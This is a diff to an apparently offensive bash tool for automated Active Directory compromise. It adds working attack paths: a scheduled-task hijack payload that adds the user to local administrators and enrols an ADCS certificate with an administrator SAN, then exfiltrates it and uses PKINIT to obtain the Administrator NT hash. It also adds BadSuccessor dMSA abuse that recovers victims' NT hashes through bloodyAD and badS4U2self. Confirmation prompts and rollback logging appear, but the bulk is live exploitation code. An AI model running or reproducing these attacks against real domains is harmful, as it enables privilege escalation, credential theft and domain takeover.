@@ -205,6 +205,11 @@ declare -A CHAIN_FROM=()          # identity (lc) → the identity we pivoted FR
 declare -A CHAIN_VIA=()           # identity (lc) → the technique that yielded it
 declare -A ABUSED_GLOBAL=()       # "target:right" already abused (across phases), fire once
 declare -A ADIDNS_DONE=()         # ADIDNS records already attempted/created in this run
+declare -A BADSUCCESSOR_DONE=()   # OU (lc) → BadSuccessor (dMSA succession) already attempted
+BADSUCCESSOR_FAC_USER=""          # an owned identity that can MINT dMSAs (BadSuccessor "factory")
+BADSUCCESSOR_FAC_OU=""            # OU DN that identity can create dMSA children in
+BADSUCCESSOR_FAC_CC=""            # that identity's Kerberos ccache (needed for the S4U2self pull)
+declare -A SHARE_DROP_DONE=()     # "user:share" → writable-share payload drop already handled
 declare -A DELETED_SID=()         # objectSid (lc) → "dn<TAB>sam" of an AD-Recycle-Bin object
 KERB_DONE=0                       # Kerberoast request runs once (SPN set is domain-wide)
 # Groups that mean "this account is effectively privileged" → crown it in the summary
@@ -2726,6 +2731,48 @@ except Exception:
 PY
 }
 
+# Generate an RSA key + a CSR carrying a UPN otherName SAN (so an EnrolleeSuppliesSubject
+# template issues a cert that authenticates AS that UPN). Used to enrol an ADCS cert
+# through code-exec as the hijack runner (certreq on the box).
+_gen_upn_csr() {
+    python3 - "$1" "$2" "$3" <<'PY' 2>/dev/null
+import sys
+try:
+    from cryptography import x509
+    from cryptography.x509.oid import NameOID, ObjectIdentifier
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    upn, keyp, csrp = sys.argv[1], sys.argv[2], sys.argv[3]
+    k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    open(keyp, 'wb').write(k.private_bytes(serialization.Encoding.PEM,
+        serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
+    UPN = ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
+    val = b"\x0c" + bytes([len(upn)]) + upn.encode()          # DER UTF8String
+    san = x509.SubjectAlternativeName([x509.OtherName(UPN, val)])
+    csr = (x509.CertificateSigningRequestBuilder()
+           .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Administrator")]))
+           .add_extension(san, critical=False).sign(k, hashes.SHA256()))
+    open(csrp, 'wb').write(csr.public_bytes(serialization.Encoding.DER))
+    print("ok")
+except Exception as e:
+    sys.stderr.write(str(e))
+PY
+}
+
+# From a saved certipy_find, return "CA_CONFIG|TEMPLATE|EKU" for the first
+# EnrolleeSuppliesSubject template (the SAN-spoofable kind). CA_CONFIG = <DC fqdn>\<CA>.
+_adcs_enrollable_template() {
+    local f; f=$(ls -t "$OUTDIR"/certipy_find*.txt 2>/dev/null | head -1); [[ -z "$f" ]] && return
+    local ca; ca=$(grep -aiP 'CA Name\s*:\s*\K.*' "$f" | head -1 | tr -d '\r' | sed 's/ *$//')
+    [[ -z "$ca" ]] && return
+    awk -v cfg="${DC_FQDN:-$DC_IP}\\\\${ca}" '
+        /Template Name/ { name=$0; sub(/.*Template Name[^:]*:[ ]*/,"",name); gsub(/\r/,"",name); ess=0; eku="" }
+        /Enrollee Supplies Subject/ { if ($0 ~ /True/) ess=1 }
+        /Extended Key Usage/ { eku=$0; sub(/.*Extended Key Usage[^:]*:[ ]*/,"",eku); gsub(/\r/,"",eku) }
+        /^[[:space:]]*$/ { if (name!="" && ess==1) { print cfg "|" name "|" eku; exit } }
+    ' "$f"
+}
+
 # Dedicated HIJACK enumeration — run as its OWN short command, NOT buried in the giant
 # recon string (there it runs last and the WinRM timeout cuts it off before it emits
 # anything). Writability is judged against OUR ACTUAL TOKEN (user SID + every group SID),
@@ -2786,11 +2833,28 @@ _hijack_one() {
     local rdir; rdir=$(sed -E 's/\\[^\\]*$//' <<<"$writ")           # parent dir of the writable target
     [[ "${writ,,}" == *.exe || "${writ,,}" == *.dll || "${writ,,}" == *.ps1 || "${writ,,}" == *.bat || "${writ,,}" == *.cmd || "${writ,,}" == *.vbs ]] || rdir="$writ"
     local marker="${rdir}\\.hjr_$$.txt"                              # whoami drop we can read back
-    # The adaptive command: try to self-elevate (works only if the runner is privileged)
-    # AND always record who actually ran it.
-    local wincmd="net localgroup administrators \"$sam\" /add & whoami > \"$marker\" 2>&1"
     local tmp="$OUTDIR/.hijack_$$"; mkdir -p "$tmp"
     local planted="" backup="" mode=""
+
+    # If ADCS has an EnrolleeSuppliesSubject template, piggy-back an enrolment on the
+    # code-exec: the payload (running AS the task's account, which may have enrolment
+    # rights we don't) also runs `certreq` with a CSR we staged (SAN = administrator).
+    # We exfil the issued cert afterwards → PKINIT to Administrator when it's client-auth.
+    local cacfg="" adtpl="" adeku="" certcmd="" certout="" lkey=""
+    local _adcs; _adcs=$(_adcs_enrollable_template)
+    if [[ -n "$_adcs" && -n "$rdir" ]] && have python3 && have openssl; then
+        cacfg="${_adcs%%|*}"; adtpl="${_adcs#*|}"; adeku="${adtpl#*|}"; adtpl="${adtpl%%|*}"
+        lkey="$tmp/hj_key.pem"
+        if [[ -n "$adtpl" ]] && _gen_upn_csr "administrator@${DOMAIN}" "$lkey" "$tmp/hj_req.csr" && [[ -s "$tmp/hj_req.csr" ]]; then
+            _winrm_put "$tmp/hj_req.csr" "${rdir}\\hjreq.csr"
+            certout="${rdir}\\hjcert.cer"
+            certcmd=" & certreq -f -q -submit -attrib \"CertificateTemplate:${adtpl}\" -config \"${cacfg}\" \"${rdir}\\hjreq.csr\" \"${certout}\" >\"${rdir}\\.hjcrt.txt\" 2>&1"
+            loot "  ${C_RED}★ ADCS: payload will also enrol template '${adtpl}' (SAN administrator) as the runner → cert${C_RESET}"
+        fi
+    fi
+    # The adaptive command: try to self-elevate (works only if the runner is privileged),
+    # record who actually ran it, and (if staged) enrol the ADCS cert as that account.
+    local wincmd="net localgroup administrators \"$sam\" /add & whoami > \"$marker\" 2>&1${certcmd}"
 
     if [[ "${writ,,}" == *.ps1 || "${writ,,}" == *.bat || "${writ,,}" == *.cmd || "${writ,,}" == *.vbs ]]; then
         # Writable SCRIPT the task runs → append our line (backup the original first).
@@ -2887,6 +2951,38 @@ _hijack_one() {
             echo "$who" >>"$OUTDIR/hijack_codeexec_identities.txt"
         else
             info "  Hijack planted but no execution observed yet (task not triggered / runs later)."
+        fi
+    fi
+
+    # ---- ADCS cert enrolled by the payload (as the runner) → exfil + use it ----------
+    if [[ -n "$certout" && -n "$who" ]]; then
+        _winrm_get "$certout" "$tmp/hjcert.cer"
+        if [[ -s "$tmp/hjcert.cer" ]]; then
+            openssl x509 -inform DER -in "$tmp/hjcert.cer" -out "$tmp/hjcert.pem" 2>/dev/null \
+                || cp "$tmp/hjcert.cer" "$tmp/hjcert.pem"
+            openssl pkcs12 -export -inkey "$lkey" -in "$tmp/hjcert.pem" -out "$tmp/hj.pfx" -passout pass: 2>/dev/null
+            local _pfx="$OUTDIR/hijack_enrolled_$(_safe_name "$adtpl").pfx"; cp -f "$tmp/hj.pfx" "$_pfx" 2>/dev/null
+            loot "  ${C_GREEN}★ ADCS cert enrolled as '${who}' via template '${adtpl}' → ${_pfx}${C_RESET}"
+            rb_record "ADCS cert issued via $adtpl (SAN administrator) as $who" "certipy ca -revoke … (or let it expire)"
+            if grep -qiE 'client auth|smart ?card|any purpose|pkinit|^[[:space:]]*$' <<<"$adeku" && ! grep -qi 'server auth' <<<"$adeku"; then
+                # Client-auth cert → PKINIT to Administrator → DA.
+                local au; au=$( cd "$tmp" && yes 2>/dev/null | timeout 60 certipy auth -pfx hj.pfx -dc-ip "$DC_IP" 2>&1 ); echo "$au" >>"$LOGFILE"
+                local ah; ah=$(grep -oiP 'Got hash for[^:]*:[a-f0-9]{32}:\K[a-f0-9]{32}' <<<"$au" | tail -1)
+                if [[ -n "$ah" ]]; then
+                    loot "${C_GREEN}${C_BOLD}★★★★ ADCS via hijack → Administrator NT hash: ${ah} — DCSync next${C_RESET}"
+                    IS_DC_ADMIN=1; note_cred_source "Administrator" "ADCS ESC1 via hijack ($adtpl)"
+                    unset "SEEN_CREDS[$(cred_key "Administrator" "" "$ah")]" 2>/dev/null
+                    queue_cred "Administrator" "" "$ah" "ADCS ESC1 via hijack ($adtpl)"
+                else
+                    warn "  ADCS auth didn't return a hash — review the PFX manually: certipy auth -pfx '$_pfx' -dc-ip $DC_IP"
+                fi
+            else
+                warn "  Template '${adtpl}' EKU='${adeku:-?}' is NOT client-auth → no PKINIT. This is a SERVICE cert (e.g. Schannel/WSUS); its target SAN is environment-specific."
+                detail "      ${C_DIM}# Re-enrol with the real service SAN, then use it (ESC8/WSUS/Schannel):${C_RESET}"
+                detail "      ${C_DIM}certreq -submit -attrib 'CertificateTemplate:${adtpl}' -config '${cacfg}' <csr-with-SAN> cert.cer   (as ${who})${C_RESET}"
+            fi
+        else
+            info "  ADCS: no cert came back (enrolment denied for '${who}', or it hasn't run yet)."
         fi
     fi
 
@@ -3285,6 +3381,16 @@ phase_acl() {
         if   [[ "$ll" == *keycredentiallink* ]]; then act="shadow"
         elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* ]]; then act="rbcd"
         elif [[ "$ll" == *serviceprincipalname* ]]; then act="spn"
+        # BadSuccessor: the right to create a msDS-DelegatedManagedServiceAccount
+        # (dMSA) child under an OU/container is a full domain-takeover primitive on
+        # Server 2025 — create a dMSA, link a target as predecessor, S4U2self →
+        # the target's keys. bloodyAD's writable output lists this as a per-class
+        # CREATE_CHILD line. This is NOT a generic ACL; it must fire its own path.
+        elif [[ "$ll" == *create_child* && "$ll" == *msds-delegatedmanagedserviceaccount* ]]; then act="badsuccessor"
+        # The mirror primitive: ability to write a victim's msDS-Superseded* attrs
+        # (often surfaced under a GenericWrite) → BadSuccessor "marker" side. Pair
+        # with a registered dMSA factory to read the victim's hash with no reset.
+        elif [[ "$ll" == *supersededmanagedaccountlink* || "$ll" == *supersededserviceaccountstate* ]]; then act="bsmark"
         elif [[ "$cur_class" == "dns" && ( "$ll" == *create_child* || "$ll" == *writeproperty* || "$ll" == *genericall* ) ]]; then act="dns"
         # Any right that lets us write a GROUP's membership → add ourselves. This
         # must catch AddSelf (Self-Membership) and AddMember too, which bloodyAD
@@ -3308,6 +3414,10 @@ phase_acl() {
             dns)    warn "Writable DNS zone (${C_BOLD}${cur_name}${C_RESET}) → ${C_BOLD}ADIDNS${C_RESET} record injection (BloodHound usually misses this one)"
                     _abuse_adidns "$cur_name" ;;
             group)  warn "Writable GROUP membership: ${C_BOLD}$cur_name${C_RESET}"; _abuse_group "$tgt" ;;
+            badsuccessor) _abuse_badsuccessor "$cur_dn" ;;
+            bsmark)
+                warn "Writable msDS-Superseded* on ${C_BOLD}$cur_name${C_RESET} → BadSuccessor marker (cross-identity)"
+                _badsuccessor_mark_and_pull "$tgt" ;;
             full)
                 warn "Full control over ${C_BOLD}$cur_name${C_RESET} (${cur_class:-?})"
                 if [[ "$cur_class" == "domain" ]]; then _abuse_dcsync_dacl
@@ -3350,6 +3460,144 @@ _abuse_adidns() {
         return 0
     fi
     warn "  Could not create ADIDNS record '$record' in ${zone}"
+    return 1
+}
+
+# ── BadSuccessor (Akamai, 2025): dMSA "successor" abuse on Windows Server 2025 ──
+# Two ACL primitives — possibly held by DIFFERENT identities — combine into a full
+# takeover, and the pivot loop pairs them automatically (no machine-specific wiring):
+#   · CREATE_CHILD msDS-DelegatedManagedServiceAccount on an OU  → "factory"
+#       (mints the dMSA, links a target on the dMSA side)
+#   · write msDS-Superseded* on a victim account                 → "marker"
+#       (links the dMSA back from the victim side — only needed on a PATCHED DC)
+# Once both links exist we run S4U2self for the dMSA: the TGS PAC carries the
+# preceded account's Kerberos keys (NT hash + AES) — no reset, no cracking. On an
+# UNPATCHED DC the marker step is unnecessary: the factory targets anyone (incl.
+# Administrator) directly. Needs bloodyAD + badS4U2self (kerbad) + a TGT.
+
+# Build the badS4U2self kerberos+ccache URL for an identity.  <user> <ccache>
+_bs_kurl() {
+    local enc; enc=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' "$2" 2>/dev/null)
+    printf 'kerberos+ccache://%s%%5C%s:%s@%s/' "$DOMAIN" "$1" "$enc" "$DC_IP"
+}
+
+# S4U2self for a dMSA → echo the preceded account's NT hash. The hash is the
+# rc4_hmac key in the TGS "previous keys" block (aes keys are also 32/64 hex, so we
+# must key on the rc4 line, not any hex token).  <creator-user> <creator-ccache> <dmsa>
+_badsuccessor_pull() {
+    local kurl sout nt; kurl=$(_bs_kurl "$1" "$2")
+    run "badS4U2self '<ccache:$1>' 'krbtgt/${DOMAIN}@${DOMAIN}' '${3}\$@${DOMAIN}' --dmsa"
+    sout=$(badS4U2self "$kurl" "krbtgt/${DOMAIN}@${DOMAIN}" "${3}\$@${DOMAIN}" --dmsa 2>&1)
+    printf '%s\n' "$sout" >>"$LOGFILE"
+    nt=$(awk 'BEGIN{p=0} /previous keys found/{p=1} p && tolower($0) ~ /rc4/{print $2; exit}' <<<"$sout")
+    [[ "$nt" =~ ^[0-9a-fA-F]{32}$ ]] && { printf '%s' "$nt"; return 0; }
+    return 1
+}
+
+# Factory side: current identity can create dMSAs under <ou_dn>. Register it as a
+# reusable factory (for the cross-identity marker path), then opportunistically try
+# the UNPATCHED path against high-value targets right now.
+_abuse_badsuccessor() {
+    local ou_dn="$1"; local ba; mapfile -t ba < <(bloody_args)
+    local okey="${ou_dn,,}"
+    [[ -n "${BADSUCCESSOR_DONE[$okey]:-}" ]] && return
+    BADSUCCESSOR_DONE["$okey"]=1
+    local base_dn="DC=${DOMAIN//./,DC=}"
+
+    warn "BadSuccessor: ${C_BOLD}$USER${C_RESET} can create a dMSA under '${ou_dn}' → dMSA-succession primitive"
+    loot "BadSuccessor primitive: msDS-DelegatedManagedServiceAccount CREATE_CHILD on '${ou_dn}' (as $USER)"
+
+    # Register a reusable dMSA factory so a LATER identity that can write a victim's
+    # msDS-Superseded* (but cannot create dMSAs) is paired with it automatically.
+    if [[ -z "$BADSUCCESSOR_FAC_USER" && "$KERBEROS" == "1" && -n "$KERB_TICKET" && -f "$KERB_TICKET" ]]; then
+        BADSUCCESSOR_FAC_USER="$USER"; BADSUCCESSOR_FAC_OU="$ou_dn"; BADSUCCESSOR_FAC_CC="$KERB_TICKET"
+        info "  registered dMSA factory: ${USER} can mint dMSAs in ${ou_dn} (reused when a later identity can mark a victim)"
+    fi
+
+    if [[ "$DO_ABUSE" != "1" ]]; then
+        info "  (report-only; --abuse to create a dMSA and recover a target's NT hash)"
+        detail "      bloodyAD ${ba[*]} add badSuccessor pwnmsa -t 'CN=Administrator,CN=Users,${base_dn}' --ou '${ou_dn}' --prepatch"
+        detail "      badS4U2self 'kerberos+ccache://${DOMAIN}%5C${USER}:<ccache>@${DC_IP}/' 'krbtgt/${DOMAIN}@${DOMAIN}' 'pwnmsa\$@${DOMAIN}' --dmsa"
+        return
+    fi
+    have bloodyAD && have badS4U2self || { warn "  need bloodyAD + badS4U2self (kerbad) for BadSuccessor"; return 1; }
+    [[ "$KERBEROS" == "1" && -n "$KERB_TICKET" && -f "$KERB_TICKET" ]] || {
+        warn "  BadSuccessor S4U2self needs a TGT for ${USER} (-k mode); primitive registered, skipping live pull"; return 1; }
+
+    # UNPATCHED path: link a high-value target on our OWN dMSA (no write on target).
+    local -a targets=()
+    if [[ -n "${BADSUCCESSOR_TARGETS:-}" ]]; then read -r -a targets <<<"$BADSUCCESSOR_TARGETS"
+    else targets=("CN=Administrator,CN=Users,${base_dn}"); fi
+    abuse_confirm "  Try BadSuccessor (unpatched path) from OU '${ou_dn}'?" || return 0
+    local t
+    for t in "${targets[@]}"; do
+        local tdisp; tdisp=$(grep -oiP '^CN=\K[^,]+' <<<"$t"); tdisp="${tdisp:-$t}"
+        local dmsa="pwnmsa$RANDOM" dn="CN=${dmsa},${ou_dn}"
+        run "bloodyAD ${ba[*]} add badSuccessor $dmsa -t '$t' --ou '$ou_dn' --prepatch"
+        local cout; cout=$(bloodyAD "${ba[@]}" add badSuccessor "$dmsa" -t "$t" --ou "$ou_dn" --prepatch 2>&1)
+        printf '%s\n' "$cout" >>"$LOGFILE"
+        _bloody_failed "$cout" && { warn "  dMSA creation failed → ${cout##*$'\n'}"; continue; }
+        rb_record "Created BadSuccessor dMSA $dn" "bloodyAD ${ba[*]} remove object '$dn'"
+        local nt; nt=$(_badsuccessor_pull "$USER" "$KERB_TICKET" "$dmsa")
+        bloodyAD "${ba[@]}" remove object "$dn" >>"$LOGFILE" 2>&1 && info "  cleaned up $dn"
+        if [[ -n "$nt" ]]; then
+            loot "★ BadSuccessor (unpatched) recovered NT hash of ${C_BOLD}${tdisp}${C_RESET}: ${C_MAGENTA}${nt}${C_RESET}"
+            note_cred_source "$tdisp" "BadSuccessor dMSA succession (NT hash)"
+            queue_cred "$tdisp" "" "$nt" "BadSuccessor"; return 0
+        fi
+        warn "  no keys for ${tdisp} — DC likely patched; cross-identity mark path will handle writable victims"
+    done
+    return 0
+}
+
+# Marker side (patched DC / cross-identity): the CURRENT identity can write a
+# victim's msDS-Superseded* but cannot create dMSAs. Pair it with a registered
+# factory (another owned identity) to recover the victim's NT hash WITHOUT a
+# password reset.  0 on success.  <victim sAMAccountName>
+_badsuccessor_mark_and_pull() {
+    local victim="$1"
+    [[ "$DO_ABUSE" == "1" ]] || return 1
+    [[ -n "$BADSUCCESSOR_FAC_USER" && -f "$BADSUCCESSOR_FAC_CC" ]] || return 1
+    have bloodyAD && have badS4U2self || return 1
+    [[ "${victim,,}" == "${BADSUCCESSOR_FAC_USER,,}" || "${victim,,}" == "${USER,,}" ]] && return 1
+    local ba; mapfile -t ba < <(bloody_args)
+
+    local vdn; vdn=$(bloodyAD "${ba[@]}" get object "$victim" --attr distinguishedName 2>/dev/null \
+                     | grep -oiP 'distinguishedName:\s*\K\S.*' | head -1)
+    [[ -z "$vdn" ]] && return 1
+    abuse_confirm "  BadSuccessor-mark '${victim}' (link a dMSA from ${BADSUCCESSOR_FAC_USER}) to recover its hash without a reset?" || return 1
+
+    local dmsa="pwnmsa$RANDOM" dn="CN=${dmsa},${BADSUCCESSOR_FAC_OU}"
+    local cba=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$BADSUCCESSOR_FAC_USER" -k)
+
+    # 1) factory creates the dMSA + links the victim on the dMSA side (--prepatch)
+    run "KRB5CCNAME=<factory:$BADSUCCESSOR_FAC_USER> bloodyAD add badSuccessor $dmsa -t '$vdn' --ou '$BADSUCCESSOR_FAC_OU' --prepatch"
+    local c1; c1=$(KRB5CCNAME="$BADSUCCESSOR_FAC_CC" bloodyAD "${cba[@]}" add badSuccessor "$dmsa" -t "$vdn" --ou "$BADSUCCESSOR_FAC_OU" --prepatch 2>&1)
+    printf '%s\n' "$c1" >>"$LOGFILE"
+    _bloody_failed "$c1" && { warn "  factory ${BADSUCCESSOR_FAC_USER} could not create dMSA → ${c1##*$'\n'}"; return 1; }
+    rb_record "Created BadSuccessor dMSA $dn (factory $BADSUCCESSOR_FAC_USER)" \
+              "KRB5CCNAME=$BADSUCCESSOR_FAC_CC bloodyAD ${cba[*]} remove object '$dn'"
+
+    # 2) current identity links the dMSA back on the VICTIM side (msDS-Superseded*)
+    run "bloodyAD ${ba[*]} set object '$victim' msDS-SupersededManagedAccountLink -v '$dn' (+ ...State -v 2)"
+    bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededManagedAccountLink -v "$dn"  >>"$LOGFILE" 2>&1
+    bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededServiceAccountState -v 2      >>"$LOGFILE" 2>&1
+    rb_record "Marked $victim superseded by $dn" \
+              "bloodyAD ${ba[*]} set object '$victim' msDS-SupersededManagedAccountLink; bloodyAD ${ba[*]} set object '$victim' msDS-SupersededServiceAccountState"
+
+    # 3) factory pulls the keys, then everything is cleaned up (best-effort)
+    local nt; nt=$(_badsuccessor_pull "$BADSUCCESSOR_FAC_USER" "$BADSUCCESSOR_FAC_CC" "$dmsa")
+    KRB5CCNAME="$BADSUCCESSOR_FAC_CC" bloodyAD "${cba[@]}" remove object "$dn" >>"$LOGFILE" 2>&1
+    bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededManagedAccountLink  >>"$LOGFILE" 2>&1
+    bloodyAD "${ba[@]}" set object "$victim" msDS-SupersededServiceAccountState  >>"$LOGFILE" 2>&1
+
+    if [[ -n "$nt" ]]; then
+        loot "★ BadSuccessor (cross-identity) recovered NT hash of ${C_BOLD}${victim}${C_RESET}: ${C_MAGENTA}${nt}${C_RESET}"
+        note_cred_source "$victim" "BadSuccessor cross-identity (mark via ${BADSUCCESSOR_FAC_USER} + dMSA succession)"
+        queue_cred "$victim" "" "$nt" "BadSuccessor"
+        return 0
+    fi
+    warn "  BadSuccessor-mark on ${victim} produced no keys"
     return 1
 }
 
@@ -3437,6 +3685,9 @@ _abuse_acl_takeover() {
 # ForceChangePassword), and only if those fail, a WriteOwner/WriteDACL takeover.
 _abuse_user_smart() {
     local target="$1"
+    # If a dMSA factory is registered, BadSuccessor-mark is the most surgical option
+    # (recovers the hash, no reset) — try it before Shadow Creds / password reset.
+    _badsuccessor_mark_and_pull "$target" && return 0
     _abuse_shadowcred "$target" && return 0
     _abuse_user "$target"       && return 0
     _abuse_acl_takeover "$target"
